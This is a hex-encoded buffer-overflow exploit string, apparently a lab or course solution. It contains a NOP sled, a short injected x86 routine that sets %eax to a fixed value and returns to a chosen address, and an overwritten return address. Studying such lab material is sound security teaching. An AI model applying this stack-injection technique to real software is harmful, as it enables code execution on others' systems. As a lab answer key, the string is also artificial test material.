90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 16 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 32 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 64 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128 bytes */

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 16 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 32 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 64 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128 bytes */

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 16 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 32 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 64 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128 bytes */

8d 6c 24 28     /* lea    0x28(%esp),%ebp */
b8 ee 7b c8 4d 	/* mov    $0x4dc87bee,%eax */
68 4e 8c 04 08  /* pushl  0x08048c4e */
c3 		/* ret */

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 16 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 32 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* 64 bytes */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90 90 90 90 /* 128 bytes */


C8 35 68 55 	/* this is return address  */
